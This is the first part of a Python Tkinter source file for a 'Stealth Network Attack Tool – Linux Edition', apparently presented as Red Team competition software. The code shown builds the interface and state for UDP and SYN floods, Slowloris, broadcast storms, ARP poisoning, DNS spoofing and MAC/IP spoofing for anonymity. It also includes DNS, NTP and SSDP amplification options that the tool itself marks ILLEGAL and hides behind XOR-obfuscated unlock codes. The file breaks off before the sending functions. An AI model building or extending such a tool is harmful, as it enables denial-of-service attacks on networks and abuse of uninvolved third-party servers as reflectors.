#!/usr/bin/env python3
"""
Stealth Network Attack Tool - Linux Edition
Enhanced version with raw socket support, packet crafting, and advanced Linux features
For Red Team vs Blue Team competitions
"""

import tkinter as tk
from tkinter import ttk, messagebox
import socket
import random
import threading
import time
import subprocess
import os
import sys
import re
import struct
import platform

class StealthJammerLinux(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Stealth Network Attack Tool - Linux Edition (Multi-Instance)")
        
        # Set window to 90% of screen size
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        window_width = int(screen_width * 0.9)
        window_height = int(screen_height * 0.9)
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        self.geometry(f"{window_width}x{window_height}+{x}+{y}")
        self.resizable(True, True)
        
        # Tab management
        self.instance_counter = 0
        self.instances = []
        
        # Configure colors and theme
        self.bg_color = "#2b2b2b"
        self.fg_color = "#00ff00"
        self.accent_color = "#00ff00"
        self.danger_color = "#ff0000"
        self.success_color = "#00ff00"
        self.warning_color = "#ffff00"
        
        self.configure(bg=self.bg_color)
        
        # Attack state
        self.attack_active = False
        self.intensity = 5
        self.attack_threads = []
        self.packets_sent = 0
        self.start_time = None
        self.bytes_sent = 0
        
        # Advanced customization settings
        self.packet_size_min = 512
        self.packet_size_max = 2048
        self.send_rate = 1000
        self.burst_size = 10
        self.thread_multiplier = 5
        
        # Packet preloading
        self.preloaded_packets = []
        self.preload_count = 1000
        self.preload_enabled = True
        
        # Performance monitoring
        self.last_packet_count = 0
        self.last_byte_count = 0
        self.last_update_time = time.time()
        self.current_pps = 0
        self.current_bandwidth = 0
        
        # Ping monitoring
        self.ping_target = "8.8.8.8"
        self.current_ping = 0
        self.ping_monitoring = False
        
        # Download speed monitoring
        self.current_download_speed = 0
        self.download_monitoring = False
        
        # Bandwidth saturation (download flood)
        self.download_flood_active = False
        self.download_flood_threads = []
        self.bytes_downloaded = 0
        
        # Anonymity features
        self.mac_randomization = False
        self.traffic_obfuscation = True
        
        # Network info
        self.current_interface = None
        self.current_mac = None
        self.original_mac = None
        self.spoofed_ip = None
        self.spoofed_mac = None
        
        # Linux-specific features
        self.raw_socket_enabled = False
        self.use_scapy = False
        self.arp_poison_enabled = False
        self.dns_spoof_enabled = False
        self.syn_flood_raw = False
        
        # Secret unlock for destructive attacks
        self.destructive_unlocked = False
        self.secret_sequence = []
        # Obfuscated code - XOR with 5 to hide the real values
        _enc = [2, 6, 7, 12, 4, 1, 13, 3]
        self.secret_code = [x ^ 5 for x in _enc]  # Decode at runtime
        self.failed_attempts = 0
        
        # Secret unlock for amplification (illegal) attacks
        self.amplification_unlocked = False
        self.amp_sequence = []
        # Different obfuscation - XOR with 7
        _amp_enc = [6, 7, 4, 0, 2, 6]
        self.amp_code = [x ^ 7 for x in _amp_enc]  # Decode at runtime
        self.amp_failed_attempts = 0
        
        # Check for root privileges
        self.is_root = self.check_root()
        
        # Check for scapy
        self.scapy_available = self.check_scapy()
        
        self.build_tabbed_ui()
        
        # Create first instance
        self.add_new_instance()
        
        self.protocol("WM_DELETE_WINDOW", self.on_destroy)
    
    def check_root(self):
        """Check if running with root privileges"""
        return os.geteuid() == 0 if hasattr(os, 'geteuid') else False
    
    def check_scapy(self):
        """Check if scapy is available"""
        try:
            import scapy.all
            return True
        except ImportError:
            return False
    
    def build_tabbed_ui(self):
        """Build the tabbed notebook interface"""
        # Configure colors
        self.bg_color = "#2b2b2b"
        self.fg_color = "#00ff00"
        self.accent_color = "#00ff00"
        self.configure(bg=self.bg_color)
        
        # Main container
        main_container = tk.Frame(self, bg=self.bg_color)
        main_container.pack(fill='both', expand=True)
        
        # Top button bar
        button_bar = tk.Frame(main_container, bg=self.bg_color, height=40)
        button_bar.pack(fill='x', padx=10, pady=5)
        
        tk.Button(button_bar, text="[+] NEW INSTANCE", command=self.add_new_instance,
                 bg='#003300', fg=self.accent_color, font=('Courier', 11, 'bold'),
                 relief='ridge', bd=2, cursor='hand2', activebackground='#005500').pack(side='left', padx=5)
        
        tk.Button(button_bar, text="[X] CLOSE CURRENT", command=self.close_current_instance,
                 bg='#330000', fg='#ff0000', font=('Courier', 11, 'bold'),
                 relief='ridge', bd=2, cursor='hand2', activebackground='#550000').pack(side='left', padx=5)
        
        # Create notebook for tabs
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TNotebook', background=self.bg_color, borderwidth=0)
        style.configure('TNotebook.Tab', background='#1a1a1a', foreground=self.fg_color,
                       padding=[20, 10], font=('Courier', 10, 'bold'))
        style.map('TNotebook.Tab', background=[('selected', '#003300')],
                 foreground=[('selected', self.accent_color)])
        
        self.notebook = ttk.Notebook(main_container)
        self.notebook.pack(fill='both', expand=True, padx=10, pady=5)
    
    def add_new_instance(self):
        """Add a new attack instance tab"""
        self.instance_counter += 1
        instance = AttackInstance(self.notebook, self.instance_counter, self.is_root, self.scapy_available, self.bg_color, self.fg_color, self.accent_color)
        self.instances.append(instance)
        self.notebook.add(instance.frame, text=f"Instance {self.instance_counter}")
        self.notebook.select(len(self.instances) - 1)
    
    def close_current_instance(self):
        """Close the currently selected instance"""
        current_tab = self.notebook.index(self.notebook.select())
        if len(self.instances) > 1:
            instance = self.instances[current_tab]
            instance.cleanup()
            self.instances.pop(current_tab)
            self.notebook.forget(current_tab)
        else:
            messagebox.showwarning("Warning", "Cannot close the last instance. Use window close button to exit.")
    
    def on_destroy(self):
        """Cleanup on exit"""
        # Cleanup all instances
        for instance in self.instances:
            instance.cleanup()
        self.destroy()


# Attack Instance Class - represents each tab
class AttackInstance:
    def __init__(self, parent, instance_id, is_root, scapy_available, bg_color, fg_color, accent_color):
        self.instance_id = instance_id
        self.is_root = is_root
        self.scapy_available = scapy_available
        self.bg_color = bg_color
        self.fg_color = fg_color
        self.accent_color = accent_color
        self.danger_color = "#ff0000"
        self.success_color = "#00ff00"
        self.warning_color = "#ffff00"
        
        # Create frame for this instance
        self.frame = tk.Frame(parent, bg=bg_color)
        
        # Attack state variables (moved from main class)
        # Configure colors and theme (already set above)
        
        # Attack state
        self.attack_active = False
        self.intensity = 5
        self.attack_threads = []
        self.packets_sent = 0
        self.start_time = None
        self.bytes_sent = 0
        
        # Advanced customization settings
        self.packet_size_min = 512
        self.packet_size_max = 2048
        self.send_rate = 1000
        self.burst_size = 10
        self.thread_multiplier = 5
        
        # Packet preloading
        self.preloaded_packets = []
        self.preload_count = 1000
        self.preload_enabled = True
        
        # Performance monitoring
        self.last_packet_count = 0
        self.last_byte_count = 0
        self.last_update_time = time.time()
        self.current_pps = 0
        self.current_bandwidth = 0
        
        # Ping monitoring
        self.ping_target = "8.8.8.8"
        self.current_ping = 0
        self.ping_monitoring = False
        
        # Download speed monitoring
        self.current_download_speed = 0
        self.download_monitoring = False
        
        # Bandwidth saturation (download flood)
        self.download_flood_active = False
        self.download_flood_threads = []
        self.bytes_downloaded = 0
        
        # Anonymity features
        self.mac_randomization = False
        self.traffic_obfuscation = True
        
        # Network info
        self.current_interface = None
        self.current_mac = None
        self.original_mac = None
        self.spoofed_ip = None
        self.spoofed_mac = None
        
        # Linux-specific features
        self.raw_socket_enabled = False
        self.use_scapy = False
        self.arp_poison_enabled = False
        self.dns_spoof_enabled = False
        self.syn_flood_raw = False
        
        # Secret unlock for destructive attacks
        self.destructive_unlocked = False
        self.secret_sequence = []
        _enc = [2, 6, 7, 12, 4, 1, 13, 3]
        self.secret_code = [x ^ 5 for x in _enc]
        self.failed_attempts = 0
        
        # Secret unlock for amplification attacks
        self.amplification_unlocked = False
        self.amp_sequence = []
        _amp_enc = [6, 7, 4, 0, 2, 6]
        self.amp_code = [x ^ 7 for x in _amp_enc]
        self.amp_failed_attempts = 0
        
        # Build UI and start monitoring
        self.build_ui()
        self.detect_network_interface()
        self.update_stats()
        self.start_ping_monitor()
        self.start_download_monitor()
        # Auto-preload packets for maximum efficiency
        threading.Thread(target=self.preload_packets_now, daemon=True).start()
    
    def build_ui(self):
        # Configure hacker-style theme
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure ttk styles for terminal theme
        style.configure('TFrame', background=self.bg_color)
        style.configure('TLabel', background=self.bg_color, foreground=self.fg_color)
        style.configure('TLabelframe', background=self.bg_color, foreground=self.fg_color, bordercolor=self.accent_color)
        style.configure('TLabelframe.Label', background=self.bg_color, foreground=self.accent_color, font=('Courier', 11, 'bold'))
        style.configure('TCheckbutton', background=self.bg_color, foreground=self.fg_color)
        style.configure('Header.TLabel', font=('Courier', 24, 'bold'), foreground=self.accent_color)
        style.configure('Subheader.TLabel', font=('Courier', 10), foreground=self.fg_color)
        style.configure('Stat.TLabel', font=('Courier', 12, 'bold'), foreground=self.success_color)
        
        # Main container with canvas for scrolling
        self.frame.grid_rowconfigure(0, weight=1)
        self.frame.grid_columnconfigure(0, weight=1)
        
        canvas_container = tk.Frame(self.frame, bg=self.bg_color)
        canvas_container.grid(row=0, column=0, sticky='nsew')
        canvas_container.grid_rowconfigure(0, weight=1)
        canvas_container.grid_columnconfigure(0, weight=1)
        canvas_container.grid_columnconfigure(1, weight=0)
        canvas_container.grid_columnconfigure(2, weight=1)
        canvas_container.grid_columnconfigure(3, weight=0)
        
        # Left canvas with scrollbar
        left_canvas = tk.Canvas(canvas_container, bg=self.bg_color, highlightthickness=0)
        left_scrollbar = ttk.Scrollbar(canvas_container, orient="vertical", command=left_canvas.yview)
        left_scrollable = ttk.Frame(left_canvas)
        
        left_scrollable.bind("<Configure>", lambda e: left_canvas.configure(scrollregion=left_canvas.bbox("all")))
        left_canvas.create_window((0, 0), window=left_scrollable, anchor="nw")
        left_canvas.configure(yscrollcommand=left_scrollbar.set)
        
        # Right canvas with scrollbar
        right_canvas = tk.Canvas(canvas_container, bg=self.bg_color, highlightthickness=0)
        right_scrollbar = ttk.Scrollbar(canvas_container, orient="vertical", command=right_canvas.yview)
        right_scrollable = ttk.Frame(right_canvas)
        
        right_scrollable.bind("<Configure>", lambda e: right_canvas.configure(scrollregion=right_canvas.bbox("all")))
        right_canvas.create_window((0, 0), window=right_scrollable, anchor="nw")
        right_canvas.configure(yscrollcommand=right_scrollbar.set)
        
        # Grid layout
        left_canvas.grid(row=0, column=0, sticky='nsew', padx=(10, 0), pady=10)
        left_scrollbar.grid(row=0, column=1, sticky='ns', padx=(0, 5))
        right_canvas.grid(row=0, column=2, sticky='nsew', padx=(5, 0), pady=10)
        right_scrollbar.grid(row=0, column=3, sticky='ns', padx=(0, 10))
        
        # Mouse wheel scrolling - properly bind to each canvas
        def on_left_mousewheel(event):
            left_canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        
        def on_right_mousewheel(event):
            right_canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        
        # Linux mouse wheel support (Button-4/5 for up/down)
        def on_left_scroll_up(event):
            left_canvas.yview_scroll(-1, "units")
        
        def on_left_scroll_down(event):
            left_canvas.yview_scroll(1, "units")
        
        def on_right_scroll_up(event):
            right_canvas.yview_scroll(-1, "units")
        
        def on_right_scroll_down(event):
            right_canvas.yview_scroll(1, "units")
        
        # Bind to left canvas and its children
        left_canvas.bind("<MouseWheel>", on_left_mousewheel)
        left_canvas.bind("<Button-4>", on_left_scroll_up)
        left_canvas.bind("<Button-5>", on_left_scroll_down)
        left_scrollable.bind("<MouseWheel>", on_left_mousewheel)
        left_scrollable.bind("<Button-4>", on_left_scroll_up)
        left_scrollable.bind("<Button-5>", on_left_scroll_down)
        
        # Bind to right canvas and its children
        right_canvas.bind("<MouseWheel>", on_right_mousewheel)
        right_canvas.bind("<Button-4>", on_right_scroll_up)
        right_canvas.bind("<Button-5>", on_right_scroll_down)
        right_scrollable.bind("<MouseWheel>", on_right_mousewheel)
        right_scrollable.bind("<Button-4>", on_right_scroll_up)
        right_scrollable.bind("<Button-5>", on_right_scroll_down)
        
        # Helper function to recursively bind scroll events to all child widgets
        def bind_tree(widget, canvas_scroll_func, scroll_up_func, scroll_down_func):
            widget.bind("<MouseWheel>", canvas_scroll_func)
            widget.bind("<Button-4>", scroll_up_func)
            widget.bind("<Button-5>", scroll_down_func)
            for child in widget.winfo_children():
                bind_tree(child, canvas_scroll_func, scroll_up_func, scroll_down_func)
        
        main_frame = ttk.Frame(left_scrollable, padding=5)
        main_frame.pack(fill='both', expand=True)
        
        right_main_frame = ttk.Frame(right_scrollable, padding=5)
        right_main_frame.pack(fill='both', expand=True)
        
        # Header
        header_frame = ttk.Frame(main_frame)
        header_frame.pack(fill='x', pady=(0, 10))
        
        title_label = ttk.Label(header_frame, text="[ STEALTH NETWORK ATTACK TOOL - LINUX ]", style='Header.TLabel')
        title_label.pack()
        
        subtitle_label = ttk.Label(header_frame, text="// Red Team Edition - Raw Socket Support //", style='Subheader.TLabel')
        subtitle_label.pack()
        
        warning_frame = tk.Frame(header_frame, bg=self.danger_color, bd=2, relief='ridge')
        warning_frame.pack(fill='x', pady=5)
        warning_label = tk.Label(warning_frame, text="[!] ROOT MODE - RAW SOCKETS ENABLED [!]" if self.is_root else "[!] USER MODE - LIMITED FEATURES [!]",
                                font=('Courier', 10, 'bold'), fg='#000000', bg=self.danger_color, pady=5)
        warning_label.pack()
        
        left_column = main_frame
        right_column = right_main_frame
        
        # Anonymity Controls
        anon_frame = ttk.LabelFrame(left_column, text="[ANONYMITY CONTROLS]", padding=15)
        anon_frame.pack(fill='x', pady=(0, 10))
        
        # MAC Randomization
        mac_frame = ttk.Frame(anon_frame)
        mac_frame.pack(fill='x', pady=5)
        ttk.Label(mac_frame, text="MAC Address Randomization", font=('Courier', 10)).pack(side='left')
        self.mac_var = tk.BooleanVar(value=False)
        self.mac_switch = ttk.Checkbutton(mac_frame, variable=self.mac_var, command=self.on_mac_toggle)
        self.mac_switch.pack(side='right')
        
        self.mac_status = ttk.Label(anon_frame, text="Current MAC: Detecting...", font=('Courier', 9))
        self.mac_status.pack(anchor='w', pady=2)
        
        mac_btn = tk.Button(anon_frame, text="[>] Generate New MAC Now", command=self.on_randomize_mac_now,
                           bg='#003300', fg=self.accent_color, font=('Courier', 9, 'bold'), 
                           relief='ridge', bd=2, cursor='hand2', activebackground='#005500')
        mac_btn.pack(fill='x', pady=5)
        
        ttk.Separator(anon_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Packet Spoofing
        spoof_label = ttk.Label(anon_frame, text="[+] IP/Port Spoofing: ACTIVE", font=('Courier', 10, 'bold'))
        spoof_label.pack(anchor='w', pady=2)
        
        self.spoof_status = ttk.Label(anon_frame, text="Spoofed IP: Generating...", font=('Courier', 9))
        self.spoof_status.pack(anchor='w', pady=2)
        
        # Traffic Obfuscation
        obfus_frame = ttk.Frame(anon_frame)
        obfus_frame.pack(fill='x', pady=5)
        ttk.Label(obfus_frame, text="Traffic Pattern Randomization", font=('Courier', 10)).pack(side='left')
        self.obfus_var = tk.BooleanVar(value=True)
        self.obfus_switch = ttk.Checkbutton(obfus_frame, variable=self.obfus_var, command=self.on_obfuscation_toggle)
        self.obfus_switch.pack(side='right')
        
        # Linux-specific Advanced Features
        linux_frame = ttk.LabelFrame(left_column, text="[LINUX ADVANCED FEATURES]", padding=15)
        linux_frame.pack(fill='x', pady=(0, 10))
        
        # Raw Socket Support
        raw_frame = ttk.Frame(linux_frame)
        raw_frame.pack(fill='x', pady=5)
        ttk.Label(raw_frame, text="Raw Socket Support (Root)", font=('Courier', 10)).pack(side='left')
        self.raw_socket_var = tk.BooleanVar(value=self.is_root)
        raw_check = ttk.Checkbutton(raw_frame, variable=self.raw_socket_var, 
                                    command=self.on_raw_socket_toggle,
                                    state='normal' if self.is_root else 'disabled')
        raw_check.pack(side='right')
        
        # Scapy Support
        scapy_frame = ttk.Frame(linux_frame)
        scapy_frame.pack(fill='x', pady=5)
        scapy_status = "Available" if self.scapy_available else "Not Installed"
        ttk.Label(scapy_frame, text=f"Scapy Packet Crafting: {scapy_status}", font=('Courier', 10)).pack(side='left')
        self.scapy_var = tk.BooleanVar(value=self.scapy_available)
        scapy_check = ttk.Checkbutton(scapy_frame, variable=self.scapy_var,
                                     command=self.on_scapy_toggle,
                                     state='normal' if self.scapy_available else 'disabled')
        scapy_check.pack(side='right')
        
        # ARP Poisoning
        arp_frame = ttk.Frame(linux_frame)
        arp_frame.pack(fill='x', pady=5)
        ttk.Label(arp_frame, text="ARP Cache Poisoning", font=('Courier', 10)).pack(side='left')
        tk.Button(arp_frame, text="[?]", font=('Courier', 7), bg='#330000', fg='#ff6666',
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("ARP Poisoning (ROOT+SCAPY)", 
                 "Poisons ARP cache to intercept/redirect traffic.\nMan-in-the-middle attack. Requires root + scapy.")).pack(side='left', padx=3)
        self.arp_var = tk.BooleanVar(value=False)
        arp_check = ttk.Checkbutton(arp_frame, variable=self.arp_var,
                                   command=self.on_arp_toggle,
                                   state='normal' if (self.is_root and self.scapy_available) else 'disabled')
        arp_check.pack(side='right')
        
        # DNS Spoofing
        dns_frame = ttk.Frame(linux_frame)
        dns_frame.pack(fill='x', pady=5)
        ttk.Label(dns_frame, text="DNS Response Spoofing", font=('Courier', 10)).pack(side='left')
        tk.Button(dns_frame, text="[?]", font=('Courier', 7), bg='#330000', fg='#ff6666',
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("DNS Spoofing (ROOT+SCAPY)", 
                 "Sends fake DNS responses to redirect domains.\nRequires root + scapy.")).pack(side='left', padx=3)
        self.dns_var = tk.BooleanVar(value=False)
        dns_check = ttk.Checkbutton(dns_frame, variable=self.dns_var,
                                   command=self.on_dns_toggle,
                                   state='normal' if (self.is_root and self.scapy_available) else 'disabled')
        dns_check.pack(side='right')
        
        # SYN Flood with Raw Sockets
        syn_frame = ttk.Frame(linux_frame)
        syn_frame.pack(fill='x', pady=5)
        ttk.Label(syn_frame, text="Raw SYN Flood (TCP Header Craft)", font=('Courier', 10)).pack(side='left')
        tk.Button(syn_frame, text="[?]", font=('Courier', 7), bg='#330000', fg='#ff6666',
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("Raw TCP SYN (ROOT)", 
                 "Manually crafts TCP/IP headers with raw sockets.\nBypasses OS TCP stack. Requires root.")).pack(side='left', padx=3)
        self.syn_raw_var = tk.BooleanVar(value=False)
        syn_check = ttk.Checkbutton(syn_frame, variable=self.syn_raw_var,
                                    command=self.on_syn_raw_toggle,
                                    state='normal' if self.is_root else 'disabled')
        syn_check.pack(side='right')
        
        # Quick Mode Selector (Terminal tab-style)
        mode_selector_frame = ttk.Frame(left_column)
        mode_selector_frame.pack(fill='x', pady=(0, 10))
        
        ttk.Label(mode_selector_frame, text="[QUICK MODE]", font=('Courier', 9, 'bold')).pack(anchor='w', pady=(0, 5))
        
        mode_buttons_frame = ttk.Frame(mode_selector_frame)
        mode_buttons_frame.pack(fill='x')
        
        self.mode_safe_btn = tk.Button(mode_buttons_frame, text="[⚡ NO ROOT]",
                                       command=self.set_safe_mode,
                                       bg='#003300', fg=self.accent_color, font=('Courier', 8, 'bold'),
                                       relief='ridge', bd=2, cursor='hand2', height=2,
                                       activebackground='#005500')
        self.mode_safe_btn.pack(side='left', padx=2, expand=True, fill='both')
        
        self.mode_full_btn = tk.Button(mode_buttons_frame, text="[🔥 ROOT]",
                                       command=self.set_full_mode,
                                       bg='#001100', fg=self.accent_color, font=('Courier', 8, 'bold'),
                                       relief='ridge', bd=2, cursor='hand2', height=2,
                                       activebackground='#003300')
        self.mode_full_btn.pack(side='left', padx=2, expand=True, fill='both')
        
        self.mode_custom_btn = tk.Button(mode_buttons_frame, text="[⚙️ CUSTOM]",
                                         command=self.set_custom_mode,
                                         bg='#001100', fg=self.accent_color, font=('Courier', 8, 'bold'),
                                         relief='ridge', bd=2, cursor='hand2', height=2,
                                         activebackground='#003300')
        self.mode_custom_btn.pack(side='left', padx=2, expand=True, fill='both')
        
        # Attack Controls (same as Windows but with terminal theme)
        attack_frame = ttk.LabelFrame(left_column, text="[ATTACK CONTROLS]", padding=15)
        attack_frame.pack(fill='x', pady=(0, 10))
        
        self.attack_button = tk.Button(attack_frame, text="[>] INITIATE ATTACK",
                                      font=('Courier', 14, 'bold'),
                                      bg='#003300', fg=self.success_color,
                                      command=self.on_attack_toggle,
                                      height=2, relief='ridge', bd=3, cursor='hand2',
                                      activebackground='#005500')
        self.attack_button.pack(fill='x', pady=5)
        
        # Intensity presets
        preset_frame = ttk.Frame(attack_frame)
        preset_frame.pack(fill='x', pady=10)
        ttk.Label(preset_frame, text="Intensity Presets:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=5)
        
        preset_buttons = ttk.Frame(preset_frame)
        preset_buttons.pack(fill='x')
        
        for name, level in [("Low", 3), ("Medium", 5), ("High", 7), ("Maximum", 10)]:
            btn = tk.Button(preset_buttons, text=f"[{name}]", command=lambda l=level: self.on_preset_click(l),
                          bg='#001100', fg=self.accent_color, font=('Courier', 9, 'bold'), 
                          relief='ridge', bd=2, cursor='hand2', activebackground='#003300')
            btn.pack(side='left', padx=2, expand=True, fill='x')
        
        # Custom intensity
        intensity_frame = ttk.Frame(attack_frame)
        intensity_frame.pack(fill='x', pady=10)
        
        intensity_header = ttk.Frame(intensity_frame)
        intensity_header.pack(fill='x')
        ttk.Label(intensity_header, text="Custom Intensity:", font=('Courier', 10, 'bold')).pack(side='left')
        tk.Button(intensity_header, text="[MAX]", command=lambda: self.intensity_var.set(10) or self.on_intensity_changed(10),
                 bg='#330000', fg='#ff0000', font=('Courier', 8, 'bold'), 
                 relief='ridge', bd=2, cursor='hand2', activebackground='#550000').pack(side='right', padx=5)
        self.intensity_label = ttk.Label(intensity_header, text="Level 10 (100%)", font=('Courier', 10, 'bold'),
                                        foreground=self.accent_color)
        self.intensity_label.pack(side='right')
        
        self.intensity_var = tk.IntVar(value=10)
        self.intensity_scale = ttk.Scale(intensity_frame, from_=1, to=10,
                                        variable=self.intensity_var,
                                        orient='horizontal',
                                        command=self.on_intensity_changed)
        self.intensity_scale.pack(fill='x', pady=5)
        
        # Attack vectors
        ttk.Label(attack_frame, text="Attack Vectors:", font=('Courier', 10, 'bold')).pack(anchor='w', pady=(10, 5))
        
        vectors_frame = ttk.Frame(attack_frame)
        vectors_frame.pack(fill='x', padx=10)
        
        # === STANDARD ATTACKS ===
        standard_label_frame = ttk.Frame(attack_frame)
        standard_label_frame.pack(fill='x', padx=10, pady=(5, 2))
        ttk.Label(standard_label_frame, text="[⚡ STANDARD ATTACKS]", 
                 font=('Courier', 9, 'bold'), foreground='#00ff00').pack(side='left')
        ttk.Label(standard_label_frame, text="(No Root Required)", 
                 font=('Courier', 8), foreground='#00aa00').pack(side='left', padx=5)
        
        # UDP Flood
        udp_frame = ttk.Frame(vectors_frame)
        udp_frame.pack(fill='x', pady=2)
        self.vector_udp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(udp_frame, text="[*] UDP Flood", variable=self.vector_udp_var).pack(side='left')
        tk.Button(udp_frame, text="[?]", font=('Courier', 7), bg='#001100', fg=self.accent_color,
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("UDP Flood", "Floods target with UDP packets. High bandwidth saturation.")).pack(side='left', padx=5)
        
        # TCP SYN Flood
        tcp_frame = ttk.Frame(vectors_frame)
        tcp_frame.pack(fill='x', pady=2)
        self.vector_tcp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(tcp_frame, text="[*] TCP SYN Flood", variable=self.vector_tcp_var).pack(side='left')
        tk.Button(tcp_frame, text="[?]", font=('Courier', 7), bg='#001100', fg=self.accent_color,
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("TCP SYN Flood", "Exhausts connection table with half-open TCP connections.")).pack(side='left', padx=5)
        
        # Broadcast Storm
        bcast_frame = ttk.Frame(vectors_frame)
        bcast_frame.pack(fill='x', pady=2)
        self.vector_broadcast_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(bcast_frame, text="[*] Broadcast Storm", variable=self.vector_broadcast_var).pack(side='left')
        tk.Button(bcast_frame, text="[?]", font=('Courier', 7), bg='#001100', fg=self.accent_color,
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("Broadcast Storm", "Floods entire network segment with broadcast packets.")).pack(side='left', padx=5)
        
        # Slowloris Attack
        slow_frame = ttk.Frame(vectors_frame)
        slow_frame.pack(fill='x', pady=2)
        self.vector_slowloris_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(slow_frame, text="[*] Slowloris", variable=self.vector_slowloris_var).pack(side='left')
        tk.Button(slow_frame, text="[?]", font=('Courier', 7), bg='#001100', fg=self.accent_color,
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("Slowloris", "Opens hundreds of connections and keeps them alive with partial HTTP headers. Exhausts web servers.")).pack(side='left', padx=5)
        
        # Bandwidth Saturation (Download Flood)
        download_flood_frame = ttk.Frame(vectors_frame)
        download_flood_frame.pack(fill='x', pady=2)
        self.vector_download_flood_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(download_flood_frame, text="[*] Bandwidth Saturation (Download Flood)", 
                       variable=self.vector_download_flood_var).pack(side='left')
        tk.Button(download_flood_frame, text="[?]", font=('Courier', 7), bg='#001100', fg=self.accent_color,
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("Bandwidth Saturation", "Downloads massive amounts of data continuously without storing. Saturates your own bandwidth and can impact network performance.")).pack(side='left', padx=5)
        
        # Separator
        ttk.Separator(attack_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # === AMPLIFICATION ATTACKS (Malicious - Reflects through 3rd parties) ===
        amp_section_frame = ttk.Frame(attack_frame)
        amp_section_frame.pack(fill='x', padx=10, pady=5)
        
        amplification_label_frame = ttk.Frame(amp_section_frame)
        amplification_label_frame.pack(fill='x', pady=(5, 2))
        ttk.Label(amplification_label_frame, text="[⚠ AMPLIFICATION ATTACKS]", 
                 font=('Courier', 9, 'bold'), foreground='#ffaa00').pack(side='left')
        ttk.Label(amplification_label_frame, text="(ILLEGAL - Reflects via 3rd parties)", 
                 font=('Courier', 8), foreground='#ff5500').pack(side='left', padx=5)
        
        # Amplification unlock section
        amp_unlock_frame = ttk.Frame(amp_section_frame)
        amp_unlock_frame.pack(fill='x', pady=5)
        
        self.amp_unlock_label = ttk.Label(amp_unlock_frame, text="[LOCKED] Type Password:", 
                                         font=('Courier', 9, 'bold'), foreground='#ffaa00')
        self.amp_unlock_label.pack(side='left')
        
        # Password entry field for amplification unlock
        self.amp_entry_var = tk.StringVar()
        self.amp_entry = tk.Entry(amp_unlock_frame, textvariable=self.amp_entry_var, 
                                 show="*", width=10, font=('Courier', 12, 'bold'),
                                 bg='#221100', fg='#ffaa00', insertbackground='#ffaa00',
                                 relief='flat', justify='center')
        self.amp_entry.pack(side='left', padx=10)
        self.amp_entry.bind('<Return>', lambda e: self.check_amp_password())
        self.amp_entry.bind('<KeyRelease>', self.on_amp_entry_change)
        
        # Amplification attacks container (hidden until unlocked)
        self.amplification_container = ttk.Frame(amp_section_frame)
        # Don't pack yet - will pack when unlocked
        
        # DNS Amplification
        dns_frame = ttk.Frame(self.amplification_container)
        dns_frame.pack(fill='x', pady=2)
        self.vector_dns_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(dns_frame, text="[*] DNS Amplification (70x)", variable=self.vector_dns_var).pack(side='left')
        tk.Button(dns_frame, text="[?]", font=('Courier', 7), bg='#221100', fg='#ffaa00',
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("DNS Amplification", "Uses public DNS servers to amplify traffic 70x. Reflects to target. ILLEGAL!")).pack(side='left', padx=5)
        
        # NTP Amplification
        ntp_frame = ttk.Frame(self.amplification_container)
        ntp_frame.pack(fill='x', pady=2)
        self.vector_ntp_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(ntp_frame, text="[*] NTP Amplification (556x)", variable=self.vector_ntp_var).pack(side='left')
        tk.Button(ntp_frame, text="[?]", font=('Courier', 7), bg='#221100', fg='#ffaa00',
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("NTP Amplification", "Exploits NTP monlist command. 556x amplification factor! ILLEGAL!")).pack(side='left', padx=5)
        
        # SSDP Amplification
        ssdp_frame = ttk.Frame(self.amplification_container)
        ssdp_frame.pack(fill='x', pady=2)
        self.vector_ssdp_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(ssdp_frame, text="[*] SSDP Amplification (30x)", variable=self.vector_ssdp_var).pack(side='left')
        tk.Button(ssdp_frame, text="[?]", font=('Courier', 7), bg='#221100', fg='#ffaa00',
                 relief='ridge', bd=1, cursor='hand2', width=3,
                 command=lambda: self.show_info("SSDP Amplification", "Exploits UPnP discovery. Reflects off IoT devices. 30x amplification. ILLEGAL!")).pack(side='left', padx=5)
        
        # Separator
        ttk.Separator(attack_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # === DESTRUCTIVE ATTACKS (Requires Root - Can Crash Systems) ===
        destructive_section_frame = ttk.Frame(attack_frame)
        destructive_section_frame.pack(fill='x', padx=10, pady=5)
        
        destructive_label_frame = ttk.Frame(destructive_section_frame)
        destructive_label_frame.pack(fill='x', pady=(5, 2))
        ttk.Label(destructive_label_frame, text="[☠ DESTRUCTIVE ATTACKS]", 
                 font=('Courier', 9, 'bold'), foreground='#ff0000').pack(side='left')
        ttk.Label(destructive_label_frame, text="(Requires Root - Can CRASH systems)", 
                 font=('Courier', 8), foreground='#cc0000').pack(side='left', padx=5)
        
        # Destructive unlock section
        dest_unlock_frame = ttk.Frame(destructive_section_frame)
        dest_unlock_frame.pack(fill='x', pady=5)
        
